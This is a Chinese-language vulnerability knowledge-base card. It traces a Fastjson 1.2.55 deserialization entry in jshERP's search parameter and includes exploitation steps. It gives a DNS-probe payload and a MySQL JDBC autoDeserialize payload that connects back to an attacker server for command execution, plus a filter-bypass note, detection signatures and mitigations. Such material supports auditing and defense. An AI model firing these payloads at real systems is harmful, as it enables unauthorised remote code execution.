---
id: web-java-deser-fastjson-jsherp-search-parseobject-entry
title: jshERP 通用列表 search JSON 参数经 StringUtil.getInfo 进入 JSONObject.parseObject：Fastjson 1.2.55 反序列化入口定位与 DNS/JDBC 利用
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-jsherp-search-parseobject-entry
tags:
- java
- fastjson
- deserialization
- jsherp
- erp
- source-audit
- dnslog
- jdbc
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
affected_versions: fastjson 1.2.55（原文 pom.xml 标记）
verification:
  verified_by: verifier-V571
  verified_at: '2026-11-12T09:26:38+08:00'
  notes: 已对照原文逐图核对：pom.xml 明示 fastjson 1.2.55（affected_versions 原文明确）；ResourceController.getList /{apiName}/list 的 search→StringUtil.getInfo→JSONObject.parseObject(search) 数据流与正文/图02一致，UserComponent.getUserList/counts 调用点及图03/04 的 Inet4Address DNS 回显实证。JDBC4Connection+autoDeserialize payload 与原文一致，但原文仅给出引用未实测（文中明言这里不继续测试），RCE 环节依赖库内既有 mysql-jdbc gadget 卡（非同链重复，本卡为入口定位）。Filter 白名单绕过上下文成立（图27 /user/getAllList.ico）。dedup 候选 ueditor 文件型 sink、mysql-jdbc gadget 卡均 related 非同链；dup-scan 无涉及 pair。未执行文中 PoC。
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson-jsherp-search-parseobject-entry/
draft: false
kb_aliases:
- jshERP fastjson 反序列化
- search 参数 parseObject
- StringUtil.getInfo JSONObject.parseObject
- ResourceController getList search 反序列化
- fastjson 1.2.55 Inet4Address DNS 探测
---

## 一句话结论

jshERP 2.3 的通用列表接口 `/{apiName}/list`（如 `/user/list`）把用户可控的 `search` 参数传入 `StringUtil.getInfo(search, key)`，其内部直接 `JSONObject.parseObject(search)` 反序列化；项目依赖 fastjson 1.2.55，攻击者用 `{"@type":"java.net.Inet4Address","val":"<dnslog域名>"}` 触发 DNS 探测即可确认反序列化，AutoType 未开启时再以 `com.mysql.jdbc.JDBC4Connection` + `autoDeserialize` 回连恶意 MySQL 服务端完成 RCE。

## 原理

- **入口数据流**：`ResourceController.getList`（`GET /{apiName}/list`）用 `@RequestParam("search")` 取 JSON 字符串放入 `parameterMap`；`CommonQueryManager.select/counts` 按 `apiName` 路由到对应 `XxxComponent`；`UserComponent.getUserList/counts` 调 `StringUtil.getInfo(search, "userName"/"loginName")`；`StringUtil.getInfo` 的实现是 `JSONObject.parseObject(search)` 后 `getString(key)`。`search` 全程无过滤，且 `parseObject` 默认解析 `@type`，构成 fastjson 反序列化入口。
- **审计定位方法**：在依赖里发现 fastjson 版本后，全局搜索 `parseObject(` / `parse(`，再对每个命中点向上追调用链找 Controller 参数；本例 `StringUtil.getInfo` 被大量 Component 复用（全局 100+ 处 `parseObject` 匹配），任一列表接口的 `search` 都可尝试注入 `@type`。
- **DNS 探测为什么有效**：fastjson 反序列化 `java.net.Inet4Address` 时会解析 `val` 字段中的主机名，触发 DNS 查询；该行为不依赖危险 gadget，常用于无回显环境确认「parseObject 是否解析攻击者 JSON」以及目标能否出网。
- **AutoType 关闭时的 JDBC 链**：`com.mysql.jdbc.JDBC4Connection`（MySQL Connector/J 5.1.x）在 1.2.55 的可实例化范围内，通过 `hostToConnectTo/portToConnectTo/info` 指定攻击者 MySQL 服务端，`info` 中设置 `autoDeserialize=true`、`statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor`，驱动连接后执行 `SHOW SESSION STATUS` 并对返回字段 `readObject`，服务端返回 ysoserial gadget 序列化数据即触发 RCE（无需目标开启 AutoType）。
- **为什么成立**：`parseObject` 是 fastjson 的自动类型反序列化 API；只要目标类在 allow/内置范围（Inet4Address、JDBC4Connection）或 AutoType 被打开，`@type` 就会驱动对象构造与危险副作用。Spring Controller 直接接收 JSON 字符串、未做 SafeMode/Feature 限制时链路完整。

## 触发条件

- 依赖 fastjson 1.2.55（或同版本段）且未开 SafeMode；`JSONObject.parseObject` 的入参可由请求控制（本例 `search` 参数）。
- 目标应用可出网（DNS 探测需能解析外部域名；JDBC 链需能连攻击者 MySQL 端口）。
- 攻击者能向列表接口发送任意 `search` 字符串（登录与否取决于 Filter；本例 Filter 白名单绕过可实现未授权）。

## 利用步骤

1. `pom.xml` 确认 fastjson 版本；全局搜索 `parseObject` 定位 `StringUtil.getInfo`，再向上追到 `ResourceController.getList`，确认 `search` 可控。
2. 抓包在 `search` 中注入 `{"@type":"java.net.Inet4Address","val":"xxx.dnslog.store"}`，观察 DNS 平台回显，确认反序列化与出网。
3. 若 AutoType 打开，可直接 JNDI/其他 gadget；若未打开，改用 MySQL JDBC 链。
4. 启动恶意 MySQL 服务端（如 MySQL_Fake_Server，配置 ysoserial gadget），构造 `JDBC4Connection` payload 指向该服务端。
5. 服务端在连接/查询阶段返回序列化数据，目标 `readObject` 触发命令执行。

最小化 PoC（search 参数值，URL 编码后发送）：

```json
{"@type":"java.net.Inet4Address","val":"xxx.dnslog.store"}
```

```json
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"<vps>","portToConnectTo":3306,"info":{"user":"yso_CommonsCollections6_<cmd>","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS":"1"},"databaseToConnectTo":"db","url":""}
```

## 变体与关联

- 通用 fastjson + MySQL JDBC autoDeserialize gadget：`com.mysql.jdbc.JDBC4Connection`、`ServerStatusDiffInterceptor`、`autoDeserialize=true` 的完整攻击面与版本差异（5.1.x/6.x/8.x）已有专门卡。
- AutoType 关闭时另有资源探测/内嵌 jar URL 类绕过（1.2.68–1.2.83）；本例 1.2.55 走 JDBC 驱动侧反序列化。
- 同一 `search` 参数体系还承载 MyBatis `${}` SQL 注入（like/直接值），审计时 `parseObject` 与 Mapper `${}` 可一并排查。
- Filter 白名单绕过可使这些接口在未登录状态可达。

## 检测与防御

- 升级 fastjson 并开启 SafeMode（`ParserConfig.getGlobalInstance().setSafeMode(true)`），或不使用 `parseObject` 解析外部 JSON 字符串（改用 `parseObject(str, Feature.DisableSpecialKeyDetect)` 等关闭特殊 key）。
- 不把 `@type` 处理能力暴露给业务参数；Controller 层对 `search` 做 JSON schema 白名单（仅允许业务字段）。
- WAF/网关拦截请求参数中的 `@type`、`java.net.Inet4Address`、`JDBC4Connection`、`AutoCloseable` 等特征。
- 出网管控：限制服务器 DNS/外连 MySQL 3306 的能力，降低 DNS 探测与 JDBC 回连的成功率；EDR 监控可疑的 MySQL 外连进程。
